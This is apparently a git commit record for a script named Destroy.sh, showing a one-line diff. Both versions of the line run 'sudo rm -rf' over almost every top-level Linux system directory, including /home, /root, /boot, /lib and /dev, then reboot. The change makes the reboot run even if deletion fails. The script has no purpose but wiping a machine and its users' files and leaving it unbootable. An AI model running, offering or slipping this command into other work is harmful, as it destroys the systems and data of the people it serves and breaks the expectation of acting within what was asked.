1ed0d59994b2da4b19c20c0fcb1c589a89579857
Hardwaregore <hardwaregore101@gmail.com>
2022-03-15 21:24:24 -0500

    Update Destroy.sh

--- Destroy.sh
+++ Destroy.sh
@@ -1,1 +1,1 @@
-sudo rm -rf /dev /home /lib32 /libx32 /media /opt /root /srv /tmp /var /boot /lib /lib64 /lost+found /mnt /proc /run /snap /sys && sudo reboot
+sudo rm -rf /dev /home /lib32 /libx32 /media /opt /root /srv /tmp /var /boot /lib /lib64 /lost+found /mnt /proc /run /snap /sys ; sudo reboot
